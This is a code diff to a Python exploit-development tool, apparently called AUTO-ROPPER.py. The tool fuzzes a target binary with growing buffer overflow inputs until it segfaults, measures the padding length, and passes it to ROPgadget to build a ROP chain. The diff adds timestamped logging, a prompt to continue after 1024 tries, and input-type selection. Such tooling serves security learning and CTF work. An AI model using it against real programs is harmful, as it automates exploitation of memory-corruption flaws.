@@ -3,6 +3,7 @@ import sys
 import argparse
 import ropgadget
 import os
+from datetime import datetime
 
 import re
 
@@ -14,7 +15,7 @@ class InputTypes(Enum):
     STDIN = 2
 
 # defind the input type (default uses FILE)
-INPUT_TYPE = 0#InputTypes.FILE
+INPUT_TYPE = 0
 
 TMP_INPUT_FILE_NAME = ".tmp_pad"
 
@@ -30,10 +31,10 @@ def get_seg_fault_addr_from_stderr(stderr):
     # Checks if there is a segfault or not
     if len(re.findall("--- SIGSEGV", stderr)) == 0:
         # Then there are no seg faults so we return with code -1
-        print("No Segfault found")
+        print("{0} - No Segfault found".format(datetime.now().strftime("%H:%M:%S")))
         return NO_SEG_FAULT
 
-    print("SEG FAULT FOUND!!!\n")
+    print("{0} - SEG FAULT FOUND!!!\n".format(datetime.now().strftime("%H:%M:%S")))
     addr_arg = re.search("si_addr=", stderr)    # There should either be only 1 or 0 seg faults a program
     end_of_addr = re.search('}', stderr).span()[0]
     
@@ -117,7 +118,7 @@ def handle_input_type(vulnerableFile, bof, inputType):
     
     # case it's smth else (weird af)
     else:
-        print("Invalid input type:", inputType, "- this really shouldn't be running")
+        print("{0} - Invalid input type: {1} - this really shouldn't be running".format(datetime.now().strftime("%H:%M:%S"), inputType))
         return None
 
 
@@ -129,12 +130,24 @@ def find_BOF(vulnerableFile, inputType):
 
     sig_addr = -1#run_strace([vulnerableFile, TMP_INPUT_FILE_NAME])
     while (sig_addr == -1 or sig_addr != head):#and counter < 20:#counter < 10:#run_strace():
+
+        if (counter == 1024):
+            answer = input("{1} - We've tried {0} bytes and haven't found an exploit. Do you want me to continue or not? (y/n): ".format(counter, datetime.now().strftime("%H:%M:%S")))
+            if   (answer == 'n'):
+                print("{0} - Exiting...".format(datetime.now().strftime("%H:%M:%S")))
+                return -1
+            elif (answer == 'y'):
+                print("{0} - Continuing...".format(datetime.now().strftime("%H:%M:%S")))
+            else:
+                print("{0} - Unknown input \"{1}\": assuming you meant no.\nExiting...".format(datetime.now().strftime("%H:%M:%S"), answer))
+                return -1
+
               
         # construct byte string
         bof = (7).to_bytes(1, byteorder='big') * 4 * counter        
         head = (33).to_bytes(1, byteorder='big') * 4
         bof += head
-        print("Unsuccessful :(\nTrying:", bof)
+        print("{0} - Unsuccessful :(\nTrying: {1}".format(datetime.now().strftime("%H:%M:%S"), bof))
 
         # Write the bof string to the program and attempt to break it
         sig_addr = handle_input_type(vulnerableFile, bof, inputType)
@@ -142,7 +155,7 @@ def find_BOF(vulnerableFile, inputType):
         counter += 1
     
     amount_of_padding = (counter - 1) * SIZE_OF_ADDRESS_IN_BYTES
-    print("BoF Exploit Found!!!\nThe length of the padding is:", amount_of_padding)
+    print("{0} - BoF Exploit Found!!!\nThe length of the padding is: {1}".format(datetime.now().strftime("%H:%M:%S"), amount_of_padding))
     
     return amount_of_padding
 
@@ -186,14 +199,29 @@ def handle_args():
 
 def main():
     args = handle_args()
+
+    print("{0} - Starting AUTO-ROPPER.py...".format(datetime.now().strftime("%H:%M:%S")))
     
+    # Get input type
+    if (args.file):
+        inputType = InputTypes.FILE
+    elif (args.arg):
+        inputType = InputTypes.ARG
+    elif (args.stdin):
+        inputType = InputTypes.STDIN
+    else:
+        raise Exception("No selected input type. You need to pick a type of input - if you are unsure run `python3 auto-padder.py --help`")
+
+
     # Define input args here
-    padding = find_BOF(args.filePath, InputTypes.FILE)
+    padding = find_BOF(args.filePath, inputType)
 
     if (args.pipe):
         cmd = os.environ.get("ROPCMD")
         if (cmd is None):
             cmd = "/bin/echo The exploit is working."
+
+            print("{0} - Piping the amount of padding into ROPGadget.py...".format(datetime.now().strftime("%H:%M:%S")))
         
         with_shellcode = []
         if (args.shellcode):
